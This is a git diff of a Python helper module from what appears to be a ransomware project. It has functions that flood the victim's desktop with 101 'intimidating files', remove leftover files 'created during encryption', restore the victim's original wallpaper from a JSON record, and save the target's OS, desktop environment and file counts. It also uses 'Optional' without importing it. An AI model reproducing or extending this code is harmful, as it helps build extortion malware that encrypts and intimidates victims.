@@ -1,41 +1,53 @@
-from os import remove, path
 from glob import glob
 from json import loads
+from CryptoApp import CryptoApp
+import os
 
 
-
+# CHECK
 # Remove every extra file that was created during encryption (on desktop)
-def removeGlobFiles(desktop_path, filenames) -> None:
-    for file in glob(f'{desktop_path}/{filenames}*.txt'):
-        try: remove(file)
+def removeGlobFiles(desktop_path: str, filename: str) -> None:
+    remove_path: str = f'{os.path.join(desktop_path, filename)}'
+
+    for file in glob(f'{remove_path}*.txt'):
+        try: os.remove(file)
         except: continue
 
 
+# CHECK
+# Create on Desktop some intimidating files
+def createGlobFiles(APP: CryptoApp, desktop_path: str, filename: str) -> None:
+    for i in range(0, 101):
+        new_file_path: str = os.path.join(desktop_path, filename)
+        APP.writeFile(f'{new_file_path}{i}.txt', 'Hello')
 
-# If decrypted successfully, handle the JSON file
-def handleAndRemoveJSONinfo(JSON_PATH, APP) -> bool | None:
 
+# CHECK
+# If decrypted successfully, handle the JSON file and return the old wallpaper
+def handleAndRemoveJSONinfo(JSON_PATH, APP) -> str | None:
     # Make sure the JSON file exists
-    if not path.isfile(JSON_PATH): return None
+    if not os.path.isfile(JSON_PATH): return None
 
-    new_wallpaper = None
+    old_wallpaper: Optional[str] = None
 
     # Parse the JSON file
-    json_file = APP.readFile(JSON_PATH)
-    to_dict = loads(json_file)
+    json_file: str = APP.readFile(JSON_PATH)
+    to_dict: dict = loads(json_file)
 
     if 'original_background' in to_dict:
         # Set the wallpaper variable
-        new_wallpaper = to_dict["original_background"]
+        old_wallpaper = to_dict["original_background"]
 
     # Remove the JSON file
-    remove(JSON_PATH)
+    os.remove(JSON_PATH)
 
-    return new_wallpaper
+    return old_wallpaper
 
 
 
-def saveInfoToJSON(target_os, target_de, dirs_num, files_num):
+# CHECK
+# Dumps the crucial informations to the JSON file
+def saveInfoToJSON(target_os: str, target_de: str, dirs_num: int, files_num: int) -> dict:
     asJSON = {}
     asJSON['os'] = target_os
     asJSON['de'] = target_de
